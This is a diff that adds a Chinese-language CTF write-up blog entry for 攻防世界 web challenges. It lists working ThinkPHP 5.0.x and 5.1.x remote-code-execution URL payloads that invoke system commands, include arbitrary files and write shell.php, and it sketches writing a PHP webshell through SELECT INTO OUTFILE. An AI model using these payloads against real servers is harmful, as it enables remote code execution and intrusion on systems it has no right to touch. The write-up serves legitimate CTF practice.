@@ -8556,6 +8556,36 @@
 ]]></content>
   </entry>
   <entry>
+    <title>攻防世界-web</title>
+    <url>/2020/07/26/mi07k6/</url>
+    <content><![CDATA[<p>emmm，BUU 那个谷歌人机验证，好难我大概是个机器人，先做点攻防世界吧…</p>
+<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>payload：<br><code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595767146312-5889a26f-643c-4a07-a304-f5a07862902f.png#align=left&display=inline&height=149&margin=%5Bobject%20Object%5D&name=image.png&originHeight=297&originWidth=1229&size=63186&status=done&style=stroke&width=614.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>payload 来自：<a href="https://y4er.com/post/thinkphp5-rce/" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-rce/</a><br>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username &#x2F;&#x2F; 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    &#x2F;&#x2F; 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     &#x2F;&#x2F; 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index|think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][0]&#x3D;whoami</span><br></pre></td></tr></table></figure>
+
+<p>5.1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595768028435-0ed11497-e69f-4426-953c-eea3cd68d1c1.png#align=left&display=inline&height=340&margin=%5Bobject%20Object%5D&name=image.png&originHeight=624&originWidth=620&size=107708&status=done&style=none&width=338" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>SHOW VARIABLES LIKE “secure_file_priv” 如果是 null 不能写<br>SELECT “php 一句话” INTO OUTFILE ‘路径’<br>然后文件包含</p>
+]]></content>
+  </entry>
+  <entry>
     <title>智能合约常见漏洞</title>
     <url>/2020/04/27/moa35g/</url>
     <content><![CDATA[<h1 id="整型溢出漏洞"><a href="#整型溢出漏洞" class="headerlink" title="整型溢出漏洞"></a>整型溢出漏洞</h1><p>用书上的例子来介绍一下：<br>一个小朋友，他可以数着手指运算十以内的运算，比如 1+1=2，他可以用两个手指算出来，但是如果你问他 5+6 等于多少，他数完十个手指之后发现手指不够用了，就会把手指扳回来，说：结果为 1，对于小朋友来说，这个问题就超纲“溢出”了</p>
